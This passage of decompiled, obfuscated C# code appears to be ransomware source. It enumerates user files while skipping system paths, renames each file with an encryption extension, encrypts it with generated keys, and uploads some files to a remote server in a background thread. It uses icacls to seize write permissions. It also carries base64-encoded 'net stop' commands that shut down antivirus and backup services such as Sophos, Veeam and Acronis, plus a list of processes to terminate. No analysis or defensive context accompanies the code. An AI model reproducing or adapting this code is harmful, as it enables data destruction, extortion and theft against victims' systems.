				{
					if (bZJnUpHOpIgqq)
					{
						try
						{
							File.AppendAllText(SlCyjezmzcjRF, "File: " + item + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (bZJnUpHOpIgqq)
						{
							try
							{
								File.AppendAllText(SlCyjezmzcjRF, "File: " + item + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						SysSpLHfXXw++;
						goto end_IL_050e;
					}
					if (ldEZLuOxqcFm == "YES" && new FileInfo(item).Length > Convert.ToInt32(OonNbDeTktyi) * 1024 * 1024 && !NANSUGkiblrGd.Contains(t1))
					{
						try
						{
							if (JqtDPljnKzmIvrJL != ".*")
							{
								if (ZKQhNlGAfwnU)
								{
									JqtDPljnKzmIvrJL = qoCjIwmYfANN + JqtDPljnKzmIvrJL;
								}
								File.Move(item, item + JqtDPljnKzmIvrJL);
							}
						}
						catch (Exception ex6)
						{
							if (bZJnUpHOpIgqq)
							{
								try
								{
									File.AppendAllText(SlCyjezmzcjRF, "File: " + item + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							SysSpLHfXXw++;
							goto end_IL_050e;
						}
						tlHeygDZtEO = "";
						if (JqtDPljnKzmIvrJL != ".*")
						{
							tlHeygDZtEO = item + JqtDPljnKzmIvrJL;
						}
						else
						{
							tlHeygDZtEO = item;
						}
						if (wrHvZpAvrSgJW == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in sSiWAwlCjtk)
								{
									if (tlHeygDZtEO.ToLower().EndsWith(item2 + JqtDPljnKzmIvrJL) && LmSFIAUjDvp == "YES")
									{
										if (Convert.ToInt32(zlQvQSTQrWnJ) * 1024 * 1024 > new FileInfo(tlHeygDZtEO).Length)
										{
											try
											{
												hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", tlHeygDZtEO);
											}
											catch
											{
											}
										}
									}
									else if (tlHeygDZtEO.ToLower().EndsWith(item2) && LmSFIAUjDvp == "NO")
									{
										try
										{
											hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", tlHeygDZtEO);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = OAYXVHDzPgdFHv.XHZvUIhBlcoaY(32);
						string text2 = "";
						text2 = (QHRYFfpHvmAnP ? OAYXVHDzPgdFHv.WsldrQcqYAlmUzOPt() : "");
						string s = DDUEkMsefa.PFPBRyzXpmMZne(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (DeTwNBVFGbT == "NO")
						{
							byte[] array = null;
							byte[] array2 = rXGCpkRzmuovpDl.ixVmRqpXGZeT(tlHeygDZtEO, Convert.ToInt32(OonNbDeTktyi) * 1024 * 1024);
							if (rXGCpkRzmuovpDl.lXlBZHvZpzmZ(hNucWYcpei: (!WSwhVqfGVa) ? (QHRYFfpHvmAnP ? rXGCpkRzmuovpDl.iCldzZsGXm(array2, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : rXGCpkRzmuovpDl.iCldzZsGXm(array2, Convert.FromBase64String(FdUEgPawbnib), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (QHRYFfpHvmAnP ? mZsSeBuSvlPmJ.voShjptzjbTK(array2, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : mZsSeBuSvlPmJ.voShjptzjbTK(array2, Convert.FromBase64String(FdUEgPawbnib), Convert.FromBase64String(yWaizfdbSvLTf))), gxtHysuevYkPA: tlHeygDZtEO, kefvkXQNqnLAH: bytes))
							{
								goto IL_0b81;
							}
							try
							{
								File.Move(item + JqtDPljnKzmIvrJL, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!QHRYFfpHvmAnP)
						{
							if (CZBAZmhlcpldk.jkBoTormCTqbO(tlHeygDZtEO, OonNbDeTktyi, FdUEgPawbnib, null, Convert.FromBase64String(yWaizfdbSvLTf)))
							{
								goto IL_0b81;
							}
							try
							{
								File.Move(item + JqtDPljnKzmIvrJL, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (CZBAZmhlcpldk.jkBoTormCTqbO(tlHeygDZtEO, OonNbDeTktyi, text, bytes, Convert.FromBase64String(text2)))
							{
								goto IL_0b81;
							}
							try
							{
								File.Move(item + JqtDPljnKzmIvrJL, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (ZKQhNlGAfwnU)
					{
						JqtDPljnKzmIvrJL = qoCjIwmYfANN + JqtDPljnKzmIvrJL;
					}
					string text3 = OAYXVHDzPgdFHv.XHZvUIhBlcoaY(32);
					string text4 = "";
					text4 = (QHRYFfpHvmAnP ? OAYXVHDzPgdFHv.WsldrQcqYAlmUzOPt() : "");
					string s2 = DDUEkMsefa.PFPBRyzXpmMZne(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (JqtDPljnKzmIvrJL != ".*")
					{
						if (!SgwcaMaFwGfR)
						{
							if (!QHRYFfpHvmAnP)
							{
								ohAjzLYTnRJd(item, item + JqtDPljnKzmIvrJL, cGCyjVdvSXL);
							}
							else
							{
								ohAjzLYTnRJd(item, item + JqtDPljnKzmIvrJL, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!QHRYFfpHvmAnP)
								{
									TloNjDlLdEBIQ(item, item + JqtDPljnKzmIvrJL, cGCyjVdvSXL, Convert.FromBase64String(yWaizfdbSvLTf));
								}
								else
								{
									TloNjDlLdEBIQ(item, item + JqtDPljnKzmIvrJL, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex11)
							{
								if (bZJnUpHOpIgqq)
								{
									try
									{
										File.AppendAllText(SlCyjezmzcjRF, "File: " + item + " - Error while fully writing to file: " + ex11.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								SysSpLHfXXw++;
								try
								{
									File.Move(item + JqtDPljnKzmIvrJL, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_050e;
							}
						}
					}
					else if (!SgwcaMaFwGfR)
					{
						if (!QHRYFfpHvmAnP)
						{
							ohAjzLYTnRJd(item, item + ".part", cGCyjVdvSXL);
						}
						else
						{
							ohAjzLYTnRJd(item, item + ".part", Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!QHRYFfpHvmAnP)
							{
								TloNjDlLdEBIQ(item, item, cGCyjVdvSXL, Convert.FromBase64String(yWaizfdbSvLTf));
							}
							else
							{
								TloNjDlLdEBIQ(item, item, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex14)
						{
							if (bZJnUpHOpIgqq)
							{
								try
								{
									File.AppendAllText(SlCyjezmzcjRF, "File: " + item + " - Error while fully writing to file: " + ex14.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							SysSpLHfXXw++;
							goto end_IL_050e;
						}
					}
					if (QHRYFfpHvmAnP)
					{
						if (JqtDPljnKzmIvrJL != ".*")
						{
							cjxIyyVHKHrvDrL(item + JqtDPljnKzmIvrJL, bytes2);
						}
						else
						{
							cjxIyyVHKHrvDrL(item, bytes2);
						}
					}
					goto IL_0b81;
					end_IL_050e:;
				}
				catch (Exception)
				{
					goto IL_0b81;
				}
				continue;
				IL_0b81:
				ZAEYxHlJQkzsPJo.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__39(string fileInfo)
		{
			if (!fileInfo.Contains("C:\\Program Files\\") && !fileInfo.Contains("C:\\Program Files (x86)\\") && !fileInfo.Contains(":\\Windows\\") && !fileInfo.ToLower().Contains("perflogs") && !fileInfo.ToLower().Contains("internet explorer") && !fileInfo.Contains(":\\ProgramData\\") && !fileInfo.Contains("\\AppData\\") && !fileInfo.ToLower().Contains("msocache") && !fileInfo.ToLower().Contains("system volume information") && !fileInfo.ToLower().Contains("boot") && !fileInfo.ToLower().Contains("tor browser") && !fileInfo.ToLower().Contains("mozilla") && !fileInfo.ToLower().Contains("google chrome") && !fileInfo.ToLower().Contains("application data") && !fileInfo.Contains("autoexec.bat") && !fileInfo.Contains("desktop.ini") && !fileInfo.Contains("autorun.inf") && !fileInfo.Contains("ntuser.dat") && !fileInfo.Contains("NTUSER.DAT") && !fileInfo.Contains("iconcache.db") && !fileInfo.Contains("bootsect.bak") && !fileInfo.Contains("boot.ini") && !fileInfo.Contains("ntuser.dat.log") && !fileInfo.Contains("thumbs.db") && !fileInfo.ToLower().Contains("bootmgr") && !fileInfo.ToLower().Contains("pagefile.sys") && !fileInfo.ToLower().Contains("config.sys") && !fileInfo.ToLower().Contains("ntuser.ini") && !fileInfo.Contains(agZtqMkMayfivgE("QnVpbGRlcl9Mb2c=")) && !fileInfo.Contains("RSAKeys") && !fileInfo.Contains("Config.enc") && !fileInfo.Contains("RESTORE_FILES_INFO") && !fileInfo.EndsWith(JqtDPljnKzmIvrJL) && !fileInfo.EndsWith("exe") && !fileInfo.EndsWith("dll") && !fileInfo.EndsWith("EXE") && !fileInfo.EndsWith("DLL") && !fileInfo.Contains("Recycle.Bin") && !fileInfo.Contains(ZJFGqhHHen) && !fileInfo.Contains(SlCyjezmzcjRF) && !fileInfo.Contains(uLoFxWVggAfF))
			{
				if (VBXQSFABSmoC.Length != 0)
				{
					string[] vBXQSFABSmoC = VBXQSFABSmoC;
					int num = 0;
					while (num < vBXQSFABSmoC.Length)
					{
						string value = vBXQSFABSmoC[num];
						if (!fileInfo.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0d5b;
					}
				}
				try
				{
					if (fileInfo.EndsWith(JqtDPljnKzmIvrJL))
					{
						goto IL_0d5b;
					}
				}
				catch (Exception)
				{
					goto IL_0d5b;
				}
				if (!HUJfkxnbjYLg.Contains(fileInfo))
				{
					if (NfVMPYnMMJ == "YES")
					{
						try
						{
							if (jARNwzUwUMTWq.KioEuDUzlDg(fileInfo))
							{
								jARNwzUwUMTWq.TLMMbRBqrsEJER(fileInfo);
							}
						}
						catch
						{
						}
					}
					HUJfkxnbjYLg.Add(fileInfo);
					if (!mmgceOUJLT.Contains(Path.GetDirectoryName(fileInfo)))
					{
						mmgceOUJLT.Add(Path.GetDirectoryName(fileInfo));
					}
					BDUUIKslMbszMvU(fileInfo);
					try
					{
						new iPIBmSPcKTz().fgMMWLFsoedzr(fileInfo);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(fileInfo, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (hzzRDIjGDyq)
								{
									Console.WriteLine("Setting write access permission: " + fileInfo + " - File Size: " + new FileInfo(fileInfo).Length + " bytes");
									Console.WriteLine("----------------------------------------------------------------------------");
								}
							}
							catch
							{
							}
							bhxKBVXCniiAP(agZtqMkMayfivgE("aWNhY2xzLmV4ZQ=="), "\"" + fileInfo + "\"" + agZtqMkMayfivgE("IC9ncmFudCA=") + "\"" + Environment.UserName + "\"" + agZtqMkMayfivgE("OkYgL1QgL0MgL1E="));
						}
					}
					catch (Exception ex2)
					{
						if (bZJnUpHOpIgqq)
						{
							try
							{
								File.AppendAllText(SlCyjezmzcjRF, "File: " + fileInfo + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(fileInfo).Length != 0L)
							{
								goto end_IL_0651;
							}
							goto end_IL_0651_2;
							end_IL_0651:;
						}
						catch (Exception ex4)
						{
							if (bZJnUpHOpIgqq)
							{
								try
								{
									File.AppendAllText(SlCyjezmzcjRF, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex4.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							SysSpLHfXXw++;
							goto end_IL_0651_2;
						}
						if (ldEZLuOxqcFm == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(OonNbDeTktyi) * 1024 * 1024)
						{
							try
							{
								if (JqtDPljnKzmIvrJL != ".*")
								{
									if (ZKQhNlGAfwnU)
									{
										JqtDPljnKzmIvrJL = qoCjIwmYfANN + JqtDPljnKzmIvrJL;
									}
									File.Move(fileInfo, fileInfo + JqtDPljnKzmIvrJL);
								}
							}
							catch (Exception ex6)
							{
								if (bZJnUpHOpIgqq)
								{
									try
									{
										File.AppendAllText(SlCyjezmzcjRF, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex6.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								SysSpLHfXXw++;
								return;
							}
							if (JqtDPljnKzmIvrJL != ".*")
							{
								fileInfo += JqtDPljnKzmIvrJL;
							}
							if (wrHvZpAvrSgJW == "YES")
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in sSiWAwlCjtk)
									{
										if (fileInfo.ToLower().EndsWith(item + JqtDPljnKzmIvrJL) && LmSFIAUjDvp == "YES")
										{
											if (Convert.ToInt32(zlQvQSTQrWnJ) * 1024 * 1024 > new FileInfo(fileInfo).Length)
											{
												try
												{
													hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", fileInfo);
												}
												catch
												{
												}
											}
										}
										else if (fileInfo.ToLower().EndsWith(item) && LmSFIAUjDvp == "NO")
										{
											try
											{
												hmdnzLvPRv.btIFxWPjUxqW("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = OAYXVHDzPgdFHv.XHZvUIhBlcoaY(32);
							string text2 = "";
							text2 = (QHRYFfpHvmAnP ? OAYXVHDzPgdFHv.WsldrQcqYAlmUzOPt() : "");
							string s = DDUEkMsefa.PFPBRyzXpmMZne(text + text2);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (DeTwNBVFGbT == "NO")
							{
								byte[] array = null;
								byte[] array2 = rXGCpkRzmuovpDl.ixVmRqpXGZeT(fileInfo, Convert.ToInt32(OonNbDeTktyi) * 1024 * 1024);
								if (!rXGCpkRzmuovpDl.lXlBZHvZpzmZ(hNucWYcpei: (!WSwhVqfGVa) ? (QHRYFfpHvmAnP ? rXGCpkRzmuovpDl.iCldzZsGXm(array2, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : rXGCpkRzmuovpDl.iCldzZsGXm(array2, Convert.FromBase64String(FdUEgPawbnib), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (QHRYFfpHvmAnP ? mZsSeBuSvlPmJ.voShjptzjbTK(array2, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : mZsSeBuSvlPmJ.voShjptzjbTK(array2, Convert.FromBase64String(FdUEgPawbnib), Convert.FromBase64String(yWaizfdbSvLTf))), gxtHysuevYkPA: fileInfo, kefvkXQNqnLAH: bytes))
								{
									try
									{
										File.Move(fileInfo + JqtDPljnKzmIvrJL, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!QHRYFfpHvmAnP)
							{
								if (!CZBAZmhlcpldk.jkBoTormCTqbO(fileInfo, OonNbDeTktyi, FdUEgPawbnib, null, Convert.FromBase64String(yWaizfdbSvLTf)))
								{
									try
									{
										File.Move(fileInfo + JqtDPljnKzmIvrJL, fileInfo);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!CZBAZmhlcpldk.jkBoTormCTqbO(fileInfo, OonNbDeTktyi, text, bytes, Convert.FromBase64String(text2)))
							{
								try
								{
									File.Move(fileInfo + JqtDPljnKzmIvrJL, fileInfo);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (ZKQhNlGAfwnU)
							{
								JqtDPljnKzmIvrJL = qoCjIwmYfANN + JqtDPljnKzmIvrJL;
							}
							string text3 = OAYXVHDzPgdFHv.XHZvUIhBlcoaY(32);
							string text4 = "";
							text4 = (QHRYFfpHvmAnP ? OAYXVHDzPgdFHv.WsldrQcqYAlmUzOPt() : "");
							string s2 = DDUEkMsefa.PFPBRyzXpmMZne(text3 + text4);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (JqtDPljnKzmIvrJL != ".*")
							{
								if (!SgwcaMaFwGfR)
								{
									if (!QHRYFfpHvmAnP)
									{
										ohAjzLYTnRJd(fileInfo, fileInfo + JqtDPljnKzmIvrJL, cGCyjVdvSXL);
									}
									else
									{
										ohAjzLYTnRJd(fileInfo, fileInfo + JqtDPljnKzmIvrJL, Convert.FromBase64String(text3));
									}
								}
								else
								{
									try
									{
										if (!QHRYFfpHvmAnP)
										{
											TloNjDlLdEBIQ(fileInfo, fileInfo + JqtDPljnKzmIvrJL, cGCyjVdvSXL, Convert.FromBase64String(yWaizfdbSvLTf));
										}
										else
										{
											TloNjDlLdEBIQ(fileInfo, fileInfo + JqtDPljnKzmIvrJL, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
										}
									}
									catch (Exception ex11)
									{
										if (bZJnUpHOpIgqq)
										{
											try
											{
												File.AppendAllText(SlCyjezmzcjRF, "File: " + fileInfo + " - Error while fully writing to file: " + ex11.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
										SysSpLHfXXw++;
										try
										{
											File.Move(fileInfo + JqtDPljnKzmIvrJL, fileInfo);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!SgwcaMaFwGfR)
							{
								if (!QHRYFfpHvmAnP)
								{
									ohAjzLYTnRJd(fileInfo, fileInfo + ".part", cGCyjVdvSXL);
								}
								else
								{
									ohAjzLYTnRJd(fileInfo, fileInfo + ".part", Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!QHRYFfpHvmAnP)
									{
										TloNjDlLdEBIQ(fileInfo, fileInfo, cGCyjVdvSXL, Convert.FromBase64String(yWaizfdbSvLTf));
									}
									else
									{
										TloNjDlLdEBIQ(fileInfo, fileInfo, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex14)
								{
									if (bZJnUpHOpIgqq)
									{
										try
										{
											File.AppendAllText(SlCyjezmzcjRF, "File: " + fileInfo + " - Error while fully writing to file: " + ex14.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
									SysSpLHfXXw++;
									return;
								}
							}
							if (QHRYFfpHvmAnP)
							{
								if (JqtDPljnKzmIvrJL != ".*")
								{
									cjxIyyVHKHrvDrL(fileInfo + JqtDPljnKzmIvrJL, bytes2);
								}
								else
								{
									cjxIyyVHKHrvDrL(fileInfo, bytes2);
								}
							}
						}
						end_IL_0651_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_0d5b;
			IL_0d5b:
			ZAEYxHlJQkzsPJo.Remove(fileInfo);
		}
	}

	[CompilerGenerated]
	private sealed class JJewnuemhCyH
	{
		public string PpKXDoxGCq;

		public string HkZEPRjZZguK;

		public void _003CEncrypt2_003Eb__47()
		{
			while (true)
			{
				try
				{
					File.Delete(PpKXDoxGCq);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__48()
		{
			while (true)
			{
				try
				{
					if (File.Exists(HkZEPRjZZguK))
					{
						File.Delete(HkZEPRjZZguK);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string iMnoJMeahQniKu = "EVET";

	public static string[] NfNepaVnWSG;

	public static IEnumerable<DirectoryInfo> vNrYZiVOIiuXol;

	public static byte[] cGCyjVdvSXL = null;

	public static DirectoryInfo UvNsOiWXZtpWNF;

	public static string nJXwSRTfZcW = "NO";

	public static string GzxiPdZuaEvsB = "100000000";

	public static List<string> ykYiTFCYjtGh = new List<string>();

	public static List<string> MLWbFMpSgysYIdL = new List<string>();

	public static string dIUHDQQEAOa = "NO";

	public static string FdUEgPawbnib = "";

	public static string yWaizfdbSvLTf = "";

	public static string DYXHJtaAOAj = "";

	public static string vwlpfQdKdIao = "NO";

	public static int oVEAITZFiruecGzH = 0;

	public static string NfVMPYnMMJ = "YES";

	public static string onQslztdxu = "NO";

	public static string vvVGzNdmiUGV = "NO";

	public static string zFYAOLWMfSryA = "0";

	public static string myVYIzyaeGJjz = "NO";

	public static string CkAwAOHwvpyf = "NO";

	public static string VNMAxwwctwAAjI = "YES";

	public static string AgLFlMaswsW = "NO";

	public static List<string> svXEViIqXeH = new List<string>
	{
		agZtqMkMayfivgE("bHNhc3MuZXhl"),
		agZtqMkMayfivgE("c3ZjaHN0LmV4ZQ=="),
		agZtqMkMayfivgE("Y3Jjc3MuZXhl"),
		agZtqMkMayfivgE("Y2hyb21lMzIuZXhl"),
		agZtqMkMayfivgE("ZmlyZWZveC5leGU="),
		agZtqMkMayfivgE("Y2FsYy5leGU="),
		agZtqMkMayfivgE("bXlzcWxkLmV4ZQ=="),
		agZtqMkMayfivgE("ZGxsaHN0LmV4ZQ=="),
		agZtqMkMayfivgE("b3BlcmEzMi5leGU="),
		agZtqMkMayfivgE("bWVtb3AuZXhl"),
		agZtqMkMayfivgE("c3Bvb2xjdi5leGU="),
		agZtqMkMayfivgE("Y3RmbW9tLmV4ZQ=="),
		agZtqMkMayfivgE("U2t5cGVBcHAuZXhl")
	};

	public static List<string> mmgceOUJLT = new List<string>();

	public static string rRwjmRsxcOt = "YES";

	public static string MztasMLQahx = "NO";

	public static string ccvClARQklpQQq = "NO";

	public static List<string> HUJfkxnbjYLg = new List<string>();

	public static string PNBWyvAPRWrU = "NO";

	private static string pcRfoHGaJe = "bc6fb807-e471-41b8-a14c-adabcf6cb0fa";

	public static string YCgDOWQTASnYBU = "YES";

	public static string fRgGjXEozID = "NO";

	public static List<string> kURnkVUZoUdPeYWA = new List<string>
	{
		agZtqMkMayfivgE("c3RhcnQgRG5zY2FjaGUgL3k="),
		agZtqMkMayfivgE("c3RhcnQgRkRSZXNQdWIgL3k="),
		agZtqMkMayfivgE("c3RhcnQgU1NEUFNSViAveQ=="),
		agZtqMkMayfivgE("c3RhcnQgdXBucGhvc3QgL3k="),
		agZtqMkMayfivgE("c3RvcCBhdnBzdXMgL3k="),
		agZtqMkMayfivgE("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		agZtqMkMayfivgE("c3RvcCBtZmV3YyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		agZtqMkMayfivgE("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		agZtqMkMayfivgE("c3RvcCBEZWZXYXRjaCAveQ=="),
		agZtqMkMayfivgE("c3RvcCBjY0V2dE1nciAveQ=="),
		agZtqMkMayfivgE("c3RvcCBjY1NldE1nciAveQ=="),
		agZtqMkMayfivgE("c3RvcCBTYXZSb2FtIC95"),
		agZtqMkMayfivgE("c3RvcCBSVFZzY2FuIC95"),
		agZtqMkMayfivgE("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		agZtqMkMayfivgE("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		agZtqMkMayfivgE("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		agZtqMkMayfivgE("c3RvcCBZb29CYWNrdXAgL3k="),
		agZtqMkMayfivgE("c3RvcCBZb29JVCAveQ=="),
		agZtqMkMayfivgE("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		agZtqMkMayfivgE("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		agZtqMkMayfivgE("c3RvcCBWU05BUFZTUyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		agZtqMkMayfivgE("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		agZtqMkMayfivgE("c3RvcCB2ZWVhbSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		agZtqMkMayfivgE("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		agZtqMkMayfivgE("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		agZtqMkMayfivgE("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		agZtqMkMayfivgE("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		agZtqMkMayfivgE("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		agZtqMkMayfivgE("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		agZtqMkMayfivgE("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBBY3JTY2gyU3ZjIC95"),
		agZtqMkMayfivgE("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		agZtqMkMayfivgE("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		agZtqMkMayfivgE("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBzb3Bob3MgL3k="),
		agZtqMkMayfivgE("c3RvcCDigJxBY3JvbmlzIFZTUyBQcm92aWRlcuKAnSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNc0R0c1NlcnZlciAveQ=="),
		agZtqMkMayfivgE("c3RvcCBJSVNBZG1pbiAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNU0V4Y2hhbmdlRVMgL3k="),
		agZtqMkMayfivgE("c3RvcCDigJxTb3Bob3MgQWdlbnTigJ0gL3k="),
		agZtqMkMayfivgE("c3RvcCBFcmFzZXJTdmMxMTcxMCAveQ=="),
		agZtqMkMayfivgE("c3RvcCDigJxFbnRlcnByaXNlIENsaWVudCBTZXJ2aWNl4oCdIC95"),
		agZtqMkMayfivgE("c3RvcCDigJxTUUwgQmFja3VwcyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNc0R0c1NlcnZlcjEwMCAveQ=="),
		agZtqMkMayfivgE("c3RvcCBOZXRNc21xQWN0aXZhdG9yIC95"),
		agZtqMkMayfivgE("c3RvcCBNU0V4Y2hhbmdlSVMgL3k="),
		agZtqMkMayfivgE("c3RvcCDigJxTb3Bob3MgQXV0b1VwZGF0ZSBTZXJ2aWNl4oCdIC95"),
		agZtqMkMayfivgE("c3RvcCBTYW1TcyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBSZXBvcnRTZXJ2ZXIgL3k="),
		agZtqMkMayfivgE("c3RvcCDigJxTUUxzYWZlIEJhY2t1cCBTZXJ2aWNl4oCdIC95"),
		agZtqMkMayfivgE("c3RvcCBNc0R0c1NlcnZlcjExMCAveQ=="),
		agZtqMkMayfivgE("c3RvcCBQT1AzU3ZjIC95"),
		agZtqMkMayfivgE("c3RvcCBNU0V4Y2hhbmdlTUdNVCAveQ=="),
		agZtqMkMayfivgE("c3RvcCDigJxTb3Bob3MgQ2xlYW4gU2VydmljZeKAnSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBTTVRQU3ZjIC95"),
		agZtqMkMayfivgE("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		agZtqMkMayfivgE("c3RvcCDigJxTUUxzYWZlIEZpbHRlciBTZXJ2aWNl4oCdIC95"),
		agZtqMkMayfivgE("c3RvcCBtc2Z0ZXNxbCRQUk9EIC95"),
		agZtqMkMayfivgE("c3RvcCBTc3RwU3ZjIC95"),
		agZtqMkMayfivgE("c3RvcCBNU0V4Y2hhbmdlTVRBIC95"),
		agZtqMkMayfivgE("c3RvcCDigJxTb3Bob3MgRGV2aWNlIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		agZtqMkMayfivgE("c3RvcCBSZXBvcnRTZXJ2ZXIkU1lTVEVNX0JHQyAveQ=="),
		agZtqMkMayfivgE("c3RvcCDigJxTeW1hbnRlYyBTeXN0ZW0gUmVjb3ZlcnnigJ0gL3k="),
		agZtqMkMayfivgE("c3RvcCBNU09MQVAkU1FMXzIwMDggL3k="),
		agZtqMkMayfivgE("c3RvcCBVSTBEZXRlY3QgL3k="),
		agZtqMkMayfivgE("c3RvcCBNU0V4Y2hhbmdlU0EgL3k="),
		agZtqMkMayfivgE("c3RvcCDigJxTb3Bob3MgRmlsZSBTY2FubmVyIFNlcnZpY2XigJ0gL3k="),
		agZtqMkMayfivgE("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTIC95"),
		agZtqMkMayfivgE("c3RvcCDigJxWZWVhbSBCYWNrdXAgQ2F0YWxvZyBEYXRhIFNlcnZpY2XigJ0gL3k="),
		agZtqMkMayfivgE("c3RvcCBNU09MQVAkU1lTVEVNX0JHQyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBXM1N2YyAveQ=="),
		agZtqMkMayfivgE("c3RvcCBNU0V4Y2hhbmdlU1JTIC95"),
		agZtqMkMayfivgE("c3RvcCDigJxTb3Bob3MgSGVhbHRoIFNlcnZpY2XigJ0gL3k="),
		agZtqMkMayfivgE("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTQU1BIC95"),
		agZtqMkMayfivgE("c3RvcCDigJxab29seiAyIFNlcnZpY2XigJ0gL3k="),
